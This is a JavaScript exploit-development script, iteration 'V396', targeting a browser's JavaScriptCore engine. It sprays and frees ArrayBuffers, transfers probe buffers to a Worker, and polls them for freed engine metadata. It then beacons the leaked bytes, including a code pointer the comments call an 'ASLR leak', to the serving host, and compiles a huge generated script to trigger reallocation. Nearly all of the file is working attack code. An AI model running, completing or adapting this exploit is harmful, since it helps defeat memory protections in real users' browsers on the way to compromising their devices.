// p396 - MAIN THREAD ALLOC: probes allocated by main thread, transferred to Worker
//
// V395 DEAD: Worker-allocated probes are in Worker's marge pages, far from
// MetadataTable (main thread's marge pages). Sweep never reaches them.
//
// FIX: Main thread allocates baits + probes (same FastMalloc = same marge pages
// as MetadataTable). Transfers AB probes to Worker via postMessage transferList.
// Worker polls transferred ABs in tight loop. Same physical addresses, Worker thread.
//
// Beacon prefix: V396-

(function() {
  var BQ = 0;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V396-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send('');
    } catch(e) {}
  }

  B('BOOT');

  // Phase 1: Main thread allocates baits and probes
  var NBAIT = 500;
  var AB_SIZE = 100112;
  var baits = [];
  var probeABs = [];
  var NPROBE = 10;

  // Allocate baits on main thread (same FastMalloc as MetadataTable will use)
  for (var i = 0; i < NBAIT; i++) {
    var ab = new ArrayBuffer(AB_SIZE);
    var v = new Uint8Array(ab);
    for (var j = 0; j < 16; j++) v[j] = 0x42; // just mark the header
    baits.push(ab);
  }
  B('BAITS-' + NBAIT);

  // Allocate probe ABs on main thread
  for (var i = 0; i < NPROBE; i++) {
    var ab = new ArrayBuffer(AB_SIZE);
    var v = new Uint8Array(ab);
    for (var j = 0; j < AB_SIZE; j++) v[j] = 0x42;
    probeABs.push(ab);
  }
  B('PROBES-' + NPROBE);

  // Free baits (pages stay mapped via MADV_FREE)
  for (var i = 0; i < baits.length; i++) baits[i] = null;
  baits = null;
  B('FREED');

  // Phase 2: Create Worker and transfer probes
  var workerCode = function() {
    var abViews = [];
    var baseUrl = '';
    var AB_SIZE = 100112;

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', baseUrl + '/beacon/V396-W-' + tag + '?t=' + Date.now(), false);
        x.send('');
      } catch(e) {}
    }
    function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') { baseUrl = e.data.baseUrl; beacon('ALIVE'); return; }

      if (e.data.cmd === 'probes') {
        var abs = e.data.buffers;
        for (var i = 0; i < abs.length; i++) {
          abViews.push(new Uint8Array(abs[i]));
        }
        beacon('GOT-' + abViews.length + '-PROBES');

        // Verify probes are intact before polling
        var ok = 0;
        for (var i = 0; i < abViews.length; i++) {
          if (abViews[i][0] === 0x42 && abViews[i][24] === 0x42 && abViews[i][68] === 0x42) ok++;
        }
        beacon('VERIFY-' + ok + '-OK');

        // Signal ready then enter tight loop
        self.postMessage({ ready: true });

        // === TIGHT BUSY LOOP ===
        beacon('TIGHTLOOP-START');
        var iter = 0;
        var hitCount = 0;

        while (true) {
          iter++;
          for (var pi = 0; pi < abViews.length; pi++) {
            var v = abViews[pi];
            // Check key offsets in the 112-byte metadata entry stride:
            // entry+0..11: BaselineCallLinkInfo (should be zeros after sweep)
            // entry+24: thunk code pointer (8 bytes - ASLR leak!)
            // entry+64: callType bitfields
            // entry+68: bytecodeIndex (sequential counter)
            if (v[0] !== 0x42 || v[24] !== 0x42 || v[64] !== 0x42 || v[68] !== 0x42 ||
                v[112] !== 0x42 || v[136] !== 0x42 || v[176] !== 0x42 || v[180] !== 0x42) {
              hitCount++;
              if (hitCount <= 20) {
                beacon('HIT-ITER' + iter + '-A' + pi);
                // Dump entry 0 (first 112 bytes) key fields
                // entry+0..11 (BaselineCallLinkInfo)
                var h0 = '';
                for (var b = 0; b < 12; b++) h0 += hexByte(v[b]);
                beacon('A' + pi + '-E0-LINK-' + h0);
                // entry+24..31 (thunk pointer - ASLR LEAK)
                var h24 = '';
                for (var b = 24; b < 32; b++) h24 += hexByte(v[b]);
                beacon('A' + pi + '-E0-THUNK-' + h24);
                // entry+64..71 (callType + bytecodeIndex)
                var h64 = '';
                for (var b = 64; b < 72; b++) h64 += hexByte(v[b]);
                beacon('A' + pi + '-E0-BITS-' + h64);
                // entry 1 at offset 112
                if (v[136] !== 0x42) {
                  var h136 = '';
                  for (var b = 136; b < 144; b++) h136 += hexByte(v[b]);
                  beacon('A' + pi + '-E1-THUNK-' + h136);
                }
                if (v[180] !== 0x42) {
                  var h180 = '';
                  for (var b = 180; b < 188; b++) h180 += hexByte(v[b]);
                  beacon('A' + pi + '-E1-BITS-' + h180);
                }
                // Count total non-0x42 bytes in first 1000
                var nonB = 0;
                var scanLen = Math.min(AB_SIZE, 1000);
                for (var j = 0; j < scanLen; j++) {
                  if (v[j] !== 0x42) nonB++;
                }
                beacon('A' + pi + '-NON42-' + nonB + '-IN1K');
              }
            }
          }
          // Heartbeat every 100K iterations
          if (iter % 100000 === 0 && hitCount === 0) {
            beacon('POLL-' + iter);
          }
          // Stop after 50M iterations (~5+ seconds of polling)
          if (iter > 50000000) {
            beacon('TIMEOUT-' + iter + '-HITS-' + hitCount);
            break;
          }
        }
      }
    };
  };

  var workerBlob = new Blob(['(' + workerCode.toString() + ')()'], { type: 'application/javascript' });
  var worker = new Worker(URL.createObjectURL(workerBlob));
  worker.postMessage({ cmd: 'init', baseUrl: location.protocol + '//' + location.host });

  // Transfer probe ABs to Worker (they keep their physical addresses)
  var transferList = probeABs.slice();
  worker.postMessage({ cmd: 'probes', buffers: probeABs }, transferList);
  probeABs = null; // neutered on main thread after transfer
  B('TRANSFERRED');

  worker.onmessage = function(e) {
    if (e.data.ready) {
      B('WORKER-READY');
      // GC pass to reclaim bait StringImpls and settle heap
      var gcR = 0;
      function gc() {
        for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
        for (var j = 0; j < 500; j++) new Array(100).fill(gcR);
        gcR++;
        if (gcR < 30) setTimeout(gc, 30);
        else { B('GC-' + gcR); build(); }
      }
      gc();
    }
  };

  function build() {
    B('BUILD');
    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;
    var cc = 'a();'.repeat(CHUNK);
    var p = [
      '(function(a){if(window.____x396){',
    ];
    for (var c = 0; c < nC; c++) p.push(cc);
    p.push('a();'.repeat(rem));
    p.push('}})(function(){});window.__p396ok=true;');
    cc = null;
    var blob = new Blob(p, {type: 'application/javascript'});
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    p = null;
    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onload = function() {
      B('COMPILED-' + (window.__p396ok ? 'OK' : 'FAIL'));
    };
    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
